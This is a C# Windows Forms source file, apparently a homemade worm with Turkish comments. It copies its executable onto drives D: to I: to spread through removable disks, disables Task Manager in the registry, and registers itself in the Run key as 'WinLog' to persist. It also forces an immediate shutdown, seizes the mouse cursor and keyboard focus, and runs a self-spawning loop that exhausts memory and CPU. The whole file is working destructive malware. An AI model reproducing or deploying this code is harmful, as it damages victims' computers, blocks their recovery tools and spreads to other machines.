using Microsoft.Win32;
using System;
using System.Text;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using System.Threading;

namespace deneme_worm
{
    public partial class Form1 : Form
    {
        // usb ve harici disklere kendini kopyalama
        static void copyFile()
        {
            //  yolu bul ve exe dosyasını kopyalamaya çalış
            string filePath = Directory.GetCurrentDirectory();
            string fileName = AppDomain.CurrentDomain.FriendlyName;
            string fileLocation = (filePath + (char)92 + fileName);
            string startupLocation = (Environment.GetEnvironmentVariable("USERPROFILE") + (char)92 + "AppData" + (char)92 + "Roaming" + (char)92 + "Microsoft" + (char)92 + "Windows" + (char)92 + "Start Menu" + (char)92 + "Programs" + (char)92 + "Startup" + (char)92 + "deneme_worm.exe");
            //   File.Copy(fileLocation, startupLocation);

            // kendini klasör ve disklerin altına kopyalama
            File.Copy(Application.ExecutablePath, @"D:/" + Application.ProductName + ".exe");
            File.Copy(Application.ExecutablePath, @"E:/" + Application.ProductName + ".exe");
            File.Copy(Application.ExecutablePath, @"F:/" + Application.ProductName + ".exe");
            File.Copy(Application.ExecutablePath, @"G:/" + Application.ProductName + ".exe");
            File.Copy(Application.ExecutablePath, @"H:/" + Application.ProductName + ".exe");
            File.Copy(Application.ExecutablePath, @"I:/" + Application.ProductName + ".exe");

        }

        static void devre_disi() 
        {
            // görev yöneticisini kayıt defteri üzerinden devre dışı bırakma
            RegistryKey rkey1 = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies", true);

            rkey1.CreateSubKey("System", RegistryKeyPermissionCheck.Default);

            rkey1.Close();

            RegistryKey rkey2 = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);

            rkey2.SetValue("DisableTaskMgr", 1);//0 olursa aktif olur

            rkey2.Close();

        }

        //tüm ram ve işlemci meşgul et ve rekürsif olarak çalış
        static void Pc_oldur()
        {
            Thread pc_oldur = new Thread(new ThreadStart(Pc_oldur));
            // Get path to .exe
            string filePath = Directory.GetCurrentDirectory();
            string fileName = AppDomain.CurrentDomain.FriendlyName;
            string fileLocation = (filePath + (char)92 + fileName);
            while (true)
            {
                //tüm ram ve işlemci meşgul et ve rekürsif olarak çalış
                pc_oldur.Start();
                Process.Start(fileLocation.ToString());
                // Try to use 100 MB of ram
                try
                {
                    Marshal.AllocHGlobal(100000000);
                }
                catch (Exception e)
                {

                }
            }
        }

                public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

            timer1.Start();// timmer i çalıştırır


            // görev yöneticisini kayıt defteri üzerinden devre dışı bırakma
            RegistryKey rkey1 = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies", true);

            rkey1.CreateSubKey("System", RegistryKeyPermissionCheck.Default);

            rkey1.Close();

            RegistryKey rkey2 = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);

            rkey2.SetValue("DisableTaskMgr", 1);//0 olursa aktif olur

            rkey2.Close();

            




            if (! File.Exists("adsasdwqeq2.a"))
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                key.SetValue("WinLog", "" + Application.ExecutablePath + "");
                using (var wr = new StreamWriter("adsasdwqeq2.a"))
                    wr.Write(" ");
                System.Diagnostics.Process.Start("shutdown", "-s -t 0 -f");// bilgisayarı kapatacak ms dos komutları çalıştırır.
               
            }
            
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            SendKeys.Send(Tab);
            Cursor.Position = new Point(new Random().Next(100, 300), new Random().Next(100, 300));// imlecin yeri sürekli değişecekk kullanıcı kontrolü sağlayamayacak

            try
            {
                copyFile();
                devre_disi();
            }
            catch (Exception)
            {
                Pc_oldur();//sonsuz döngü
                
            }
        }



    }
}
